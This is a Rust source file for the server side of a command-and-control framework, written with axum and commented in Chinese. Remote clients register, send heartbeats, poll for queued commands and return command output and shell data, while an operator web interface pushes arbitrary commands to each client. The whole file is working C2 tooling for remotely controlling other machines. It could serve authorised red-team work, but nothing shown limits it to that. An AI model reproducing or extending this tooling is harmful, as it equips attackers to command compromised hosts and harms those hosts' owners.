use std::sync::Arc;
use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::Html,
    routing::{get, post},
    Json, Router,
};
use tower_http::{cors::CorsLayer, services::ServeDir};
use askama::Template;
use log::{info, warn, error};
use tokio::time::{interval, Duration};

// 引入框架模块
use rust_c2_framework::*;

/// 服务器应用状态
#[derive(Clone)]
pub struct AppState {
    pub client_manager: Arc<client_manager::ClientManager>,
    pub shell_manager: Arc<shell_manager::ShellManager>,
    pub audit_logger: Arc<audit::AuditLogger>,
    pub config: Arc<config::ServerConfig>,
}

/// Web模板
#[derive(Template)]
#[template(path = "index.html")]
struct IndexTemplate {
    clients: Vec<ClientInfo>,
}

#[derive(Template)]
#[template(path = "client.html")]
struct ClientTemplate {
    client: ClientInfo,
    commands: Vec<CommandResponse>,
}

/// API处理器
/// 客户端注册
async fn register_client(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        state.client_manager.register_client(client_info.clone()).await;
        state.audit_logger.log_client_connect(&client_info);
        info!("Client registered: {}", client_info.id);
        Ok(StatusCode::OK)
    } else {
        error!("Invalid client registration data");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 心跳处理
async fn handle_heartbeat(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        state.client_manager.update_heartbeat(&client_info.id).await;
        Ok(StatusCode::OK)
    } else {
        error!("Invalid heartbeat data");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 获取客户端命令
async fn get_commands(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<Json<Vec<CommandRequest>>, StatusCode> {
    let commands = state.client_manager.get_commands(&client_id).await;
    Ok(Json(commands))
}

/// 接收命令结果
async fn handle_command_result(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
        state.client_manager.add_command_result(result.clone()).await;
        state.audit_logger.log_command_result(&result);
        Ok(StatusCode::OK)
    } else {
        error!("Invalid command result data");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 处理Shell数据
async fn handle_shell_data(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(shell_data) = String::from_utf8(message.payload) {
        // 这里可以实现Shell数据的处理和转发
        info!("Received shell data: {} bytes", shell_data.len());
        Ok(StatusCode::OK)
    } else {
        error!("Invalid shell data");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// Web界面处理器
/// 主页面
async fn index(State(state): State<AppState>) -> Result<Html<String>, StatusCode> {
    let clients = state.client_manager.get_clients().await;
    
    let template = IndexTemplate { clients };
    
    match template.render() {
        Ok(html) => Ok(Html(html)),
        Err(e) => {
            error!("Template render error: {}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// 客户端详情页面
async fn client_detail(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<Html<String>, StatusCode> {
    if let Some(client) = state.client_manager.get_client(&client_id).await {
        let commands = state.client_manager.get_command_results(&client_id).await;
        
        let template = ClientTemplate { client, commands };
        
        match template.render() {
            Ok(html) => Ok(Html(html)),
            Err(e) => {
                error!("Template render error: {}", e);
                Err(StatusCode::INTERNAL_SERVER_ERROR)
            }
        }
    } else {
        warn!("Client not found: {}", client_id);
        Err(StatusCode::NOT_FOUND)
    }
}

/// 发送命令到客户端
async fn send_command(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
    Json(mut cmd): Json<CommandRequest>,
) -> Result<StatusCode, StatusCode> {
    cmd.client_id = client_id.clone();
    
    state.client_manager.add_command(&client_id, cmd.clone()).await;
    state.audit_logger.log_command_execution(&cmd);
    
    info!("Command sent to client {}: {}", client_id, cmd.command);
    Ok(StatusCode::OK)
}

/// 获取客户端列表API
async fn api_clients(State(state): State<AppState>) -> Json<Vec<ClientInfo>> {
    let clients = state.client_manager.get_clients().await;
    Json(clients)
}

/// 获取命令结果API
async fn api_command_results(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Json<Vec<CommandResponse>> {
    let results = state.client_manager.get_command_results(&client_id).await;
    Json(results)
}

/// 清理任务
async fn cleanup_task(state: AppState) {
    let mut interval = interval(Duration::from_secs(300)); // 每5分钟清理一次
    
    loop {
        interval.tick().await;
        
        // 清理离线客户端
        state.client_manager.cleanup_offline_clients(state.config.client_timeout as i64).await;
        
        // 清理过期Shell会话
        state.shell_manager.cleanup_expired_sessions(3600).await; // 1小时
        
        info!("Cleanup task completed");
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // 初始化日志
    env_logger::init();
    
    // 加载配置
    let config = Arc::new(config::ConfigManager::load_server_config("server.toml")?);
    
    // 创建应用状态
    let state = AppState {
        client_manager: Arc::new(client_manager::ClientManager::new()),
        shell_manager: Arc::new(shell_manager::ShellManager::new()),
        audit_logger: Arc::new(audit::AuditLogger::new(&config.log_file)),
        config: config.clone(),
    };

    // 启动清理任务
    let cleanup_state = state.clone();
    tokio::spawn(async move {
        cleanup_task(cleanup_state).await;
    });

    // 创建路由
    let app = Router::new()
        // Web界面路由
        .route("/", get(index))
        .route("/client/:id", get(client_detail))
        // API路由
        .route("/api/register", post(register_client))
        .route("/api/heartbeat", post(handle_heartbeat))
        .route("/api/commands/:client_id", get(get_commands))
        .route("/api/command_result", post(handle_command_result))
        .route("/api/shell_data", post(handle_shell_data))
        .route("/api/clients", get(api_clients))
        .route("/api/clients/:client_id/commands", post(send_command))
        .route("/api/clients/:client_id/results", get(api_command_results))
        // 静态文件服务
        .nest_service("/static", ServeDir::new(&config.web.static_dir))
        .layer(if config.web.enable_cors {
            CorsLayer::permissive()
        } else {
            CorsLayer::new()
        })
        .with_state(state);

    let addr = format!("{}:{}", config.host, config.port);
    info!("C2 Server starting on http://{}", addr);
    
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    axum::serve(listener, app).await?;

    Ok(())
}
